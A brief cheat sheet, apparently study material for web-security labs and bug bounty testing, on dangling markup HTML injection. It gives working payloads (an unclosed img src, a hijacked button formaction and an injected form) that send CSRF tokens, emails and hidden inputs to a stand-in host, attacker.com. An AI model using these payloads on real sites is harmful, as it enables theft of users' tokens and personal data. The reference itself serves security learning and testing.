# Dangling Markup CheatSheet

## What Is Dangling Markup?

An HTML injection technique used when:

```text
JavaScript Execution
        ↓
Not Possible
```

but HTML injection is still available.

---

# Classic Payload

```html
"><img src='https://attacker.com?
```

---

# Why It Works

Browser keeps reading:

```text
Everything Until
Next Quote
```

---

# Form Hijacking

```html
"><button
formaction="https://attacker.com"
formmethod="GET">
Click
</button>
```

---

# Alternative Form Injection

```html
<form action="https://attacker.com">

<input
name="data">

</form>
```

---

# Attack Flow

```text
HTML Injection
        ↓
Sensitive Data Captured
        ↓
Attacker Receives Data
```

---

# Common Targets

```text
CSRF Tokens
Email Addresses
Usernames
Hidden Inputs
```

---

# Related Lab

```text
Lab29
```

---

# Bug Bounty Reminder

If CSP blocks:

```html
<script>
```

always test:

```text
Dangling Markup
Form Hijacking
```